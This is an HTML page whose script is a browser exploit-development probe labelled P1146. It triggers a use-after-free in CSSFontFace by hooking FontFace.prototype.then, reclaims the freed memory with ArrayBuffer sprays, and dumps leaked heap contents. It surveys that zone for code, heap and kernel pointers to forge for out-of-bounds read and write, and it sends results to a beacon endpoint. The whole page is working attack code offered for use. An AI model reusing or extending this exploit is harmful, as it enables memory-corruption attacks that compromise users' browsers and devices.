<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1146</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body><div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}

log('phase','=== P1146: ADJACENT OBJECT CORRUPTION via CSSFontFace UAF ===');
log('info','Strategy: UAF reclaim gives us controlled 192B cell.');
log('info','Key: find WHAT ELSE lives in the 192B bmalloc size class!');
log('info','If we can forge a vtable ptr or length field -> OOB R/W');
B('P1146-START','t='+Date.now());

// ===== PHASE 1: UAF + reclaim (standard) =====
var r=Date.now()%100000;
var uafHit=false;
var sprayBufs=[];

var st=document.createElement('style');
st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
document.head.appendChild(st);
var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(ff);void ff.loaded;

Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(uafHit)return undefined;uafHit=true;
  if(st.parentNode)st.remove();
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;
  for(var k=0;k<80;k++) sprayBufs.push(new ArrayBuffer(192));
  return undefined;
},set:function(){}});

document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});

setTimeout(function(){
  delete FontFace.prototype.then;

  // Find reclaimed buffer
  var rIdx=-1,rv=null;
  for(var k=0;k<sprayBufs.length;k++){
    var v=new BigUint64Array(sprayBufs[k]);
    for(var q=0;q<v.length;q++){if(v[q]!==0n){rIdx=k;rv=v;break;}}
    if(rIdx>=0)break;
  }
  if(rIdx<0){log('fail','No reclaim');B('P1146-DONE','reclaim=false');return;}

  var orig=[];
  for(var q=0;q<rv.length;q++) orig.push(rv[q]);
  log('ok','Reclaimed idx='+rIdx+' q0='+hex64(rv[0])+' q11='+hex64(rv[11])+' q13='+hex64(rv[13]));
  B('P1146-RECLAIM','idx='+rIdx+'|q11='+hex64(rv[11])+'|q13='+hex64(rv[13]));

  // ===== PHASE 2: Investigate bmalloc 192B zone neighbors =====
  log('phase','--- Phase 2: 192B zone object survey ---');

  // Idea: Allocate many different JS objects that might be ~192 bytes
  // Then free CSSFontFace + those objects, spray with ArrayBuffers at 192B
  // Scan for non-zero patterns that reveal WHAT objects share the zone

  // APPROACH A: Multiple CSSFontFace UAFs to map the zone
  // Create 20 more font faces, trigger UAF on all, then spray and scan
  // This tells us if there are OTHER non-zero patterns (other object types)

  var fonts=[];
  var styles=[];
  for(var i=0;i<20;i++){
    var sid='f'+r+'_'+i;
    var s=document.createElement('style');
    s.textContent="@font-face{font-family:"+sid+";src:local(Arial);unicode-range:U+00"+(42+i).toString(16).toUpperCase()+"}";
    document.head.appendChild(s);
    var f=new FontFace(sid,'local(Helvetica)',{unicodeRange:'U+00'+(42+i).toString(16).toUpperCase()});
    document.fonts.add(f);
    void f.loaded;
    fonts.push(f);
    styles.push(s);
  }

  // Also create objects that MIGHT be 192 bytes in bmalloc
  // - TextDecoder (internal state ~192B?)
  // - MessageChannel ports?
  // - Event objects?
  // - DOMRect?
  // - various CSS objects

  var miscObjects=[];
  // TextDecoder
  for(var i=0;i<30;i++){
    try{miscObjects.push(new TextDecoder('utf-8'));}catch(e){}
  }
  // DOMRect
  for(var i=0;i<30;i++){
    try{miscObjects.push(new DOMRect(i,i,100+i,100+i));}catch(e){}
  }
  // MessageChannel
  var channels=[];
  for(var i=0;i<15;i++){
    try{var mc=new MessageChannel();channels.push(mc);miscObjects.push(mc.port1);miscObjects.push(mc.port2);}catch(e){}
  }
  // DOMMatrix
  for(var i=0;i<30;i++){
    try{miscObjects.push(new DOMMatrix([1,0,0,1,i,i]));}catch(e){}
  }
  // Headers (Fetch API)
  for(var i=0;i<30;i++){
    try{miscObjects.push(new Headers({'X-Test':'val'+i}));}catch(e){}
  }
  // URLSearchParams
  for(var i=0;i<30;i++){
    try{miscObjects.push(new URLSearchParams('a='+i+'&b='+i));}catch(e){}
  }
  // AbortController
  for(var i=0;i<30;i++){
    try{miscObjects.push(new AbortController());}catch(e){}
  }

  log('info','Created '+miscObjects.length+' misc objects + '+fonts.length+' extra FontFaces');
  B('P1146-OBJS','misc='+miscObjects.length+'|fonts='+fonts.length);

  // Now free the extra fonts by removing their styles
  for(var i=0;i<styles.length;i++){
    try{if(styles[i].parentNode)styles[i].remove();}catch(e){}
    try{document.fonts.delete(fonts[i]);}catch(e){}
  }

  // Drop references to misc objects to let GC collect them
  var savedMisc=miscObjects; // keep ref temporarily
  miscObjects=null;
  channels=null;

  // Force GC
  for(var i=0;i<5;i++){
    var junk=[];
    for(var j=0;j<10000;j++) junk.push({x:j});
    junk=null;
  }

  // Now spray with 192B ArrayBuffers to reclaim freed cells
  var spray2=[];
  for(var k=0;k<200;k++) spray2.push(new ArrayBuffer(192));

  // Scan ALL spray buffers for non-zero content
  var patterns={};
  var hitCount=0;
  var cffCount=0; // CSSFontFace pattern (q0=1, q11=heap)
  var otherCount=0;
  var samples=[];

  for(var k=0;k<spray2.length;k++){
    var v=new BigUint64Array(spray2[k]);
    var hasNZ=false;
    for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
    if(!hasNZ) continue;
    hitCount++;

    // Classify: is this a CSSFontFace residue or something else?
    var isCFF=(v[0]===1n && v[11]!==0n); // refcount=1, q11=heap ptr
    if(isCFF){
      cffCount++;
    }else{
      otherCount++;
      // This is interesting! Something ELSE lives in 192B zone!
      if(samples.length<10){
        var dump=[];
        for(var q=0;q<24;q++) dump.push(hex64(v[q]));
        samples.push({idx:k,q0:hex64(v[0]),dump:dump});
      }
    }

    // Build a fingerprint: which qwords are non-zero
    var fp='';
    for(var q=0;q<24;q++) fp+=(v[q]!==0n)?'1':'0';
    patterns[fp]=(patterns[fp]||0)+1;
  }

  log('ok','Spray2: '+hitCount+' non-zero buffers');
  log('info','  CSSFontFace pattern: '+cffCount);
  log('info','  OTHER patterns: '+otherCount);
  B('P1146-SCAN','hits='+hitCount+'|cff='+cffCount+'|other='+otherCount);

  // Report unique patterns
  var patKeys=[];
  for(var k in patterns) patKeys.push(k);
  patKeys.sort(function(a,b){return patterns[b]-patterns[a];});
  log('phase','--- Unique patterns ('+patKeys.length+') ---');
  for(var i=0;i<Math.min(patKeys.length,8);i++){
    log('info','  ['+patterns[patKeys[i]]+'x] '+patKeys[i]);
  }
  B('P1146-PATTERNS','n='+patKeys.length+'|top='+patKeys.slice(0,4).join(';'));

  // Report interesting non-CFF samples
  if(samples.length>0){
    log('phase','--- NON-CFF object dumps ---');
    for(var si=0;si<samples.length;si++){
      var s=samples[si];
      log('ptr','Sample '+si+' idx='+s.idx+' q0='+s.q0);
      log('ptr','  '+s.dump.slice(0,8).join(' '));
      log('ptr','  '+s.dump.slice(8,16).join(' '));
      log('ptr','  '+s.dump.slice(16,24).join(' '));
      // Beacon first 2 samples
      if(si<3){
        B('P1146-SAMPLE-'+si,'q0='+s.q0+'|q1='+s.dump[1]+'|q2='+s.dump[2]+'|q11='+s.dump[11]+'|q13='+s.dump[13]);
      }
    }
  }

  // ===== PHASE 3: Check if any non-CFF pattern has pointers =====
  log('phase','--- Phase 3: Pointer analysis ---');
  var codePtr=0,heapPtr=0,stackPtr=0,kernPtr=0;
  for(var k=0;k<spray2.length;k++){
    var v=new BigUint64Array(spray2[k]);
    for(var q=0;q<24;q++){
      if(v[q]===0n) continue;
      var hi=Number(v[q]>>32n);
      var lo=Number(v[q]&0xFFFFFFFFn);
      // Code pointer (eboot ~0x530000xxxx)
      if(hi>=0x5300 && hi<=0x53FF) codePtr++;
      // Heap pointer (0x1000xxxxxxxx range)
      if(hi>=0x1000 && hi<=0x10FF) heapPtr++;
      // Stack-like
      if(hi>=0x7F00 && hi<=0x7FFF) stackPtr++;
      // Kernel
      if(hi>=0xFFFF8000) kernPtr++;
    }
  }
  log('info','Code ptrs: '+codePtr+', Heap ptrs: '+heapPtr+', Stack ptrs: '+stackPtr+', Kern ptrs: '+kernPtr);
  B('P1146-PTRS','code='+codePtr+'|heap='+heapPtr+'|stack='+stackPtr+'|kern='+kernPtr);

  if(codePtr>0){
    log('win','!!! CODE POINTERS FOUND IN 192B ZONE !!!');
    log('win','An object with vtable/function ptrs shares the zone!');
  }

  // Restore original reclaimed buffer
  for(var q=0;q<orig.length;q++) rv[q]=orig[q];

  // Drop second spray refs
  savedMisc=null;

  B('P1146-DONE','hits='+hitCount+'|cff='+cffCount+'|other='+otherCount+'|code='+codePtr+'|heap='+heapPtr);
  log('phase','=== P1146 COMPLETE ===');
},40);
</script></body></html>
